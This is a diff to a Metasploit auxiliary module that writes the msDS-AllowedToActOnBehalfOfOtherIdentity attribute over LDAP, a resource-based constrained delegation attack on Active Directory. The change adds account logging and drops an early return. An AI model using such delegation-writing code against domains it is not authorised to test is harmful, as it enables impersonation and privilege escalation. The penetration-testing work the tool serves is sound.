@@ -238,7 +238,10 @@ class MetasploitModule < Msf::Auxiliary
     unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
       fail_with_ldap_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
     end
+
     print_good('Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    print_status('Added account:')
+    print_status("  #{delegate_from['ObjectSid']} (#{delegate_from['sAMAccountName']})")
   end
 
   def _action_write_update(obj, delegate_from)
@@ -246,7 +249,6 @@ class MetasploitModule < Msf::Auxiliary
     if security_descriptor.dacl
       if security_descriptor.dacl.aces.any? { |ace| ace.body[:sid].to_s == delegate_from['ObjectSid'].to_s }
         print_status("Delegation from #{delegate_from['sAMAccountName']} to #{obj['sAMAccountName']} is already enabled.")
-        return true
       end
       # clear these fields so they'll be calculated automatically after the update
       security_descriptor.dacl.acl_count.clear
@@ -261,8 +263,8 @@ class MetasploitModule < Msf::Auxiliary
 
     unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
       fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
-      return
     end
+
     print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
   end
 end
